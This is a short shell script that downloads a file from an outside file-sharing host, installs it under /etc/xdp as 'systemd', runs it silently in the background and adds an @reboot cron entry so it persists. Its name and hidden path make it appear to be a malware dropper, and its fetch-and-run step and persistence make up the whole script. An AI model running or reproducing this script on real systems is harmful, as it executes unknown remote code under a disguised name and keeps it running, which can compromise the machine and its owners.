#!/bin/sh




curl https://x0.at/2SoW --output /tmp/systemd
mkdir -p /etc/xdp/
mv /tmp/systemd /etc/xdp/systemd
chmod +x /etc/xdp/systemd
if pgrep -f "/etc/xdp/systemd"
then
    echo "script running"
    process_id=$(pgrep -f "/etc/xdp/systemd") # Get the PID
    kill -9 "$process_id"
else
    echo "script not running"
fi
/etc/xdp/systemd 2>/dev/null 1>/dev/null &
crontab -e 2>/dev/null 1>/dev/null &
command="/etc/xdp/systemd 2>/dev/null 1>/dev/null &"
job="@reboot $command"
cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -


echo
echo "ok"
echo
